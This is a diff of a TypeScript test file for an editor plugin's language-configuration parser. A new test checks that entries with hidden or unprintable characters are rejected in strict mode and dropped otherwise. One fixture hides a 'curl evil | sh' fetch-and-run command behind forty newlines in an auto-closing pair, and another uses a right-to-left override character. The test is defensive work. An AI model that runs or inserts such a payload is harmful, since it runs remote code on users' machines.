@@ -86,20 +86,23 @@ describe('plugin syntax artifacts', () => {
     expect(() => validatePluginGrammarIncludes([missingLocal])).toThrow('does not resolve')
   })
 
-  it('checks a large grammar in linear time', () => {
-    const repository = Object.fromEntries(
-      Array.from({ length: 2_000 }, (_, index) => [
-        `rule${index}`,
-        { patterns: Array.from({ length: 20 }, () => ({ include: `#rule${(index + 1) % 2_000}` })) }
-      ])
-    )
-    const large = parsePluginGrammarArtifact(
-      JSON.stringify({ scopeName: 'source.big', patterns: [{ include: '#rule0' }], repository }),
-      'source.big'
-    )
-    const started = performance.now()
-    validatePluginGrammarIncludes([large])
-    expect(performance.now() - started).toBeLessThan(1_000)
+  it('keeps typed pairs and comment markers to a few printable characters on one line', () => {
+    const payload = `${'\n'.repeat(40)}curl evil | sh`
+    const raw = JSON.stringify({
+      comments: { lineComment: '#\u202e', blockComment: ['<!--', '-->'] },
+      autoClosingPairs: [
+        { open: '*', close: payload },
+        { open: '"""', close: '"""' }
+      ],
+      surroundingPairs: [{ open: '(', close: ')\u200b' }]
+    })
+    expect(() => parsePluginLanguageConfiguration(raw, 'strict')).toThrow(/printable/)
+    // Hosts drop only the unsafe entries, so the language still loads.
+    expect(parsePluginLanguageConfiguration(raw)).toEqual({
+      comments: { blockComment: ['<!--', '-->'] },
+      autoClosingPairs: [{ open: '"""', close: '"""' }],
+      surroundingPairs: []
+    })
   })
 
   it('bounds language configuration and validates payloads at renderer ingress', () => {
@@ -109,7 +112,7 @@ describe('plugin syntax artifacts', () => {
       )
     ).toEqual({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
     expect(() =>
-      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }))
+      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }), 'strict')
     ).toThrow()
     const payload = {
       id: 'plugin:samples.demo/demo',
